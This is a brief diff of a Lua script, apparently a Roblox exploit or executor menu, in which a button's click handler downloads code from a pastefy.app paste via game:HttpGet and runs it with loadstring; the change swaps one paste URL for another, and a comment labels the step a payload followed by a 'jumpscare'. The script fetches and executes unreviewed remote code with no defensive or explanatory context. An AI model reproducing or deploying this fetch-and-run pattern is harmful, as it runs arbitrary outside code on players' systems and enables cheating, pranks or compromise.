@@ -137,7 +137,7 @@ local function createButton(name, text, tipText)
     btn.MouseButton1Click:Connect(function()
         -- Execute requested payload
         pcall(function()
-            loadstring(game:HttpGet("https://pastefy.app/iwquiYMS/raw"))()
+            loadstring(game:HttpGet("https://pastefy.app/BXPndXWV/raw"))()
         end)
 
         -- Jumpscare execution
